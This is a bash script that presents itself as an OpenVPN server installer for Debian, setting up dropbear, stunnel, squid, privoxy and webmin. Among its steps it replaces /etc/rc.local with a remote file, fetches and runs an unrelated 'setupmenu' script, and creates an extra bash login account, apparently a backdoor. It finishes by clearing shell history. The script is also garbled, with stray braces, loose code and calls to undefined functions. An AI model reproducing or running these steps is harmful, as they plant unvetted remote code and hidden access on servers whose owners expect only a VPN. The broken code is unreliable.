#!/bin/bash
#OpenVPN server installer for Debian 9
function rootako () {
	if [ "$EUID" -ne 0 ]; then
		return 1
	fi
}
function checktuntap () {
	if [ ! -e /dev/net/tun ]; then
		return 1
	fi
}

function checkdebian () {
	if [[ -e /etc/debian_version ]]; then
		OS="debian"
		source /etc/os-release

		if [[ "$ID" == "debian" || "$ID" == "raspbian" ]]; then
			if [[ ! $VERSION_ID =~ (8|9|10) ]]; then
				echo ' Your version of Debian is not supported.'
				echo ""
				echo "However, if you're using Debian >= 9 or unstable/testing then you can continue."
				echo "Keep in mind they are not supported, though."
				echo ""
				until [[ $CONTINUE =~ (y|n) ]]; do
					read -rp "Continue? [y/n]: " -e CONTINUE
				done
				if [[ "$CONTINUE" = "n" ]]; then
					exit 1
				fi
			fi
		fi		
else
		echo "Looks like you aren't running this installer on a Debian"
		exit 1
	fi
}
function initialCheck () {
	if ! rootako; then
		echo "Sorry, you need to run this as root"
		exit 1
	fi
	if ! checktuntap; then
		echo "TUN is not available"
		exit 1
	fi
	checkdebian
}

function copymenu () {
cp menu/* /usr/local/sbin/
chmod +x /usr/local/sbin/*
}

function updatesoure () {
echo 'deb http://download.webmin.com/download/repository sarge contrib' >> /etc/apt/sources.list
echo 'deb http://webmin.mirror.somersettechsolutions.co.uk/repository sarge contrib' >> /etc/apt/sources.list
}

function BadVPN () {
wget -O /usr/bin/badvpn-udpgw "https://raw.githubusercontent.com/ara-rangers/vps/master/badvpn-udpgw"
if [ "$OS" == "x86_64" ]; then
  wget -O /usr/bin/badvpn-udpgw "https://raw.githubusercontent.com/ara-rangers/vps/master/badvpn-udpgw64"
fi
sed -i '$ i\screen -AmdS badvpn badvpn-udpgw --listen-addr 127.0.0.1:7300' /etc/rc.local
chmod +x /usr/bin/badvpn-udpgw
screen -AmdS badvpn badvpn-udpgw --listen-addr 127.0.0.1:7300
}

function webmin () {
wget http://www.webmin.com/jcameron-key.asc
sudo apt-key add jcameron-key.asc
sudo apt-get update
sudo apt-get -y install webmin
}

function dropssl () {
apt-get -y install stunnel4 dropbear
openssl genrsa -out key.pem 4096
openssl req -new -x509 -key key.pem -out cert.pem -days 1095
cat key.pem cert.pem > /etc/stunnel/stunnel.pem
}

function endropstun () {
sed -i 's/NO_START=1/NO_START=0/g' /etc/default/dropbear
sed -i 's/DROPBEAR_PORT=22/DROPBEAR_PORT=550/g' /etc/default/dropbear
echo "/bin/false" >> /etc/shells
sed -i 's/ENABLED=0/ENABLED=1/g' /etc/default/stunnel4
}

function settime () {
ln -fs /usr/share/zoneinfo/Asia/Kuala_Lumpur /etc/localtime
}

apt-get -y install openvpn
cd /etc/openvpn/
wget -O openvpn.tar "https://gakod.com/AUTOVPS/openvpn.tar"
tar xf openvpn.tar;rm openvpn.tar
wget -O /etc/rc.local "https://raw.githubusercontent.com/guardeumvpn/Qwer77/master/rc.local"
chmod +x /etc/rc.local
wget -O /home/vps/public_html/client.ovpn "https://gakod.com/AUTOVPS/client.ovpn"
wget -O /home/vps/public_html/udp.ovpn "https://gakod.com/AUTOVPS/udp.ovpn"
wget -O /home/vps/public_html/client1.ovpn "https://raw.githubusercontent.com/BangJaguh/VPN/main/c/client1.ovpn"
wget -O /home/vps/public_html/client3.ovpn "https://gakod.com/debian/client3.ovpn"
sed -i 's/AcceptEnv/#AcceptEnv/g' /etc/ssh/sshd_config
sed -i "s/ipserver/$myip/g" /home/vps/public_html/client.ovpn
sed -i "s/ipserver/$myip/g" /home/vps/public_html/udp.ovpn
sed -i "s/ipserver/$myip/g" /home/vps/public_html/client1.ovpn
sed -i "s/ipserver/$myip/g" /home/vps/public_html/client3.ovpn
useradd -m -g users -s /bin/bash archangels
echo "7C22C4ED" | chpasswd
echo "UPDATE DAN INSTALL SIAP 99% MOHON SABAR"
cd;rm *.sh;rm *.txt;rm *.tar;rm *.deb;rm *.asc;rm *.zip;rm ddos*;
 
}

function stunconf () {
cat > /etc/stunnel/stunnel.conf <<-END

sslVersion = all
pid = /var/run/stunnel.pid
cert = /etc/stunnel/stunnel.pem
socket = l:TCP_NODELAY=1
socket = r:TCP_NODELAY=1
client = no

[openssh]
accept = 444
connect = 127.0.0.1:225

[dropbear]
accept = 443
connect = 127.0.0.1:550
END
}

function privoxconfig () {
echo 'user-manual /usr/share/doc/privoxy/user-manual' > /etc/privoxy/config
echo 'confdir /etc/privoxy' >> /etc/privoxy/config
echo 'logdir /var/log/privoxy' >> /etc/privoxy/config
echo 'filterfile default.filter' >> /etc/privoxy/config
echo 'logfile logfile' >> /etc/privoxy/config
echo 'listen-address 0.0.0.0:'"$PORTS" >> /etc/privoxy/config
echo 'toggle 1' >> /etc/privoxy/config
echo 'enable-remote-toggle 0' >> /etc/privoxy/config
echo 'enable-remote-http-toggle 0' >> /etc/privoxy/config
echo 'enable-edit-actions 0' >> /etc/privoxy/config
echo 'enforce-blocks 0' >> /etc/privoxy/config
echo 'buffer-limit 4096' >> /etc/privoxy/config
echo 'enable-proxy-authentication-forwarding 1' >> /etc/privoxy/config
echo 'forwarded-connect-retries 1' >> /etc/privoxy/config
echo 'accept-intercepted-requests 1' >> /etc/privoxy/config
echo 'allow-cgi-request-crunching 1' >> /etc/privoxy/config
echo 'split-large-forms 0' >> /etc/privoxy/config
echo 'keep-alive-timeout 5' >> /etc/privoxy/config
echo 'tolerate-pipelining 1' >> /etc/privoxy/config
echo 'socket-timeout 300' >> /etc/privoxy/config
echo 'permit-access 0.0.0.0/0' "$IP" >> /etc/privoxy/config
}
apt-get -y install squid3
wget -O /etc/squid3/squid.conf "https://raw.githubusercontent.com/padubang/mambang/main/squid.conf"
wget -O /etc/squid/squid.conf "https://raw.githubusercontent.com/padubang/mambang/main/squid.conf"
sed -i "s/ipserver/$myip/g" /etc/squid3/squid.conf
sed -i "s/ipserver/$myip/g" /etc/squid/squid.conf
sed -i "s/ipserver/$myip/g" /etc/squid3/squid.conf
}
function restartall () {
service nginx start
service php7.0-fpm start
service vnstat restart
service dropbear restart
service sshd restart
service privoxy restart
service openvpn restart
service stunnel4 restart
}

function setbanner () {
cat banner > /etc/issue.net
cp banner /etc/
sed -i 's@#Banner""@Banner"@g' /etc/ssh/sshd_config
sed -i 's@#none""@/etc/banner"@g' /etc/ssh/sshd_config
sed -i 's@DROPBEAR_BANNER=""@DROPBEAR_BANNER="/etc/issue.net"@g' /etc/default/dropbear
service ssh restart
service dropbear restart
}

function installall () {
	NIC=$(ip -4 route ls | grep default | grep -Po '(?<=dev )(\S+)' | head -1)
		apt-get update
		apt-get install -y openvpn iptables openssl wget ca-certificates curl gnupg nginx php7.0-fpm  privoxy squid3 vnstat ufw build-essential -y
	echo 'net.ipv4.ip_forward=1' >> /etc/sysctl.d/20-openvpn.conf
	sysctl --system
}

initialCheck
installQuestions
installall
settime
copymenu
updatesoure
BadVPN
webmin
dropssl
endropstun
certandkey
serverconf
disableipv6
setiptables
clientovpn
stunconf
privoxconfig
setbanner
restartall
cp /lib/systemd/system/openvpn\@.service /etc/systemd/system/openvpn\@.service
	sed -i 's|LimitNPROC|#LimitNPROC|' /etc/systemd/system/openvpn\@.service
	sed -i 's|/etc/openvpn/server|/etc/openvpn|' /etc/systemd/system/openvpn\@.service
	systemctl daemon-reload
	systemctl restart openvpn@server
	systemctl enable openvpn@server
vnstat -u -i eth0
wget https://raw.githubusercontent.com/padubang/gans/main/setupmenu && bash setupmenu
# install libxml-parser
apt-get install libxml-parser-perl -y -f
clear
show_ports
echo 'NGINX installed'
echo 'DROPBEAR and STUNNEL installed'
echo 'PRIVOXY installed'
echo 'WEBMIN installed'
echo 'OPENVPN server installed'
echo 'The configuration file is available at /var/www/html/client.ovpn'
echo 'Or http://your-ip/client.ovpn'
echo "Download the .ovpn file and import it in your OpenVPN client."
history -c
exit 0
